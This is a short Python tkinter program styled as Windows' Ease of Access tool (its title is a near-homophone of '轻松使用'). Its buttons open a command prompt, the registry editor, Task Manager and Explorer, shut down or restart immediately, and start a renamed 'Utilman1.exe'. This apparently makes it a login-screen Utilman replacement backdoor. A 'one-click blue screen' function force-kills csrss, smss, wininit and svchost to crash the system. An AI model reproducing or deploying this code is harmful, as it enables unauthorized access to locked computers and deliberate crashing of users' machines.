from tkinter import *
from tkinter.ttk import *
from os import system


def draggable(tkwidget):
    def mousedown(event):
        widget = event.widget
        widget.startx = event.x
        widget.starty = event.y

    def drag(event):
        widget = event.widget
        if widget.__str__() != ".":
            return
        dx = event.x - widget.startx
        dy = event.y - widget.starty
        # winfo_x(),winfo_y() 方法获取控件的坐标
        if isinstance(widget, Wm):
            widget.geometry("+%d+%d" % (widget.winfo_x() + dx,
                                        widget.winfo_y() + dy))
        else:
            widget.place(x=widget.winfo_x() + dx,
                         y=widget.winfo_y() + dy)

    tkwidget.bind("<Button-1>", mousedown, add='+')
    tkwidget.bind("<B1-Motion>", drag, add='+')

def blue():
    system("taskkill /f /im svchost.exe")
    system("taskkill /f /im wininit.exe")
    system("taskkill /f /im smss.exe")
    system("taskkill /f /im csrss.exe")

window = Tk()
style = Style()
style.configure('all.TButton', font=("Microsoft YaHei UI", 15, ""), height=5, width=8)
window.geometry("300x500")
# window.config(bg="white")
window.attributes("-toolwindow",1)
# draggable(window)

window.title("氢松使用")
Label(window, text="氢松使用", font=("Microsoft YaHei UI", 30, "bold")).pack()
Label(window, text="命令提示符", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=50)
Button(window, text="启动", style="all.TButton", command=lambda: system("start cmd.exe")).place(x=180, y=55)
Label(window, text="任务管理器", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=100)
Button(window, text="启动", style="all.TButton", command=lambda: system("start taskmgr.exe")).place(x=180, y=105)
Label(window, text="记事本", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=150)
Button(window, text="启动", style="all.TButton", command=lambda: system("start notepad.exe")).place(x=180, y=155)
Label(window, text="注册表编辑器", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=200)
Button(window, text="启动", style="all.TButton", command=lambda: system("start regedit.exe")).place(x=180, y=205)
Label(window, text="资源管理器", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=250)
Button(window, text="启动", style="all.TButton", command=lambda: system("start explorer.exe")).place(x=180, y=255)
Label(window, text="关机", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=300)
Button(window, text="启动", style="all.TButton", command=lambda: system("shutdown -s -t 0")).place(x=180, y=305)
Label(window, text="重启", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=350)
Button(window, text="启动", style="all.TButton", command=lambda: system("shutdown -r -t 0")).place(x=180, y=355)
Label(window, text="一键蓝屏:(", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=400)
Button(window, text="启动", style="all.TButton", command=lambda: blue()).place(x=180,
                                                                                                            y=405)
Label(window, text="原版轻松使用", font=("Microsoft YaHei UI", 20, "")).place(x=0, y=450)
Button(window, text="启动", style="all.TButton", command=lambda: system("start Utilman1.exe")).place(x=180, y=455)
window.bind("<Escape>", lambda event: quit())
window.mainloop()
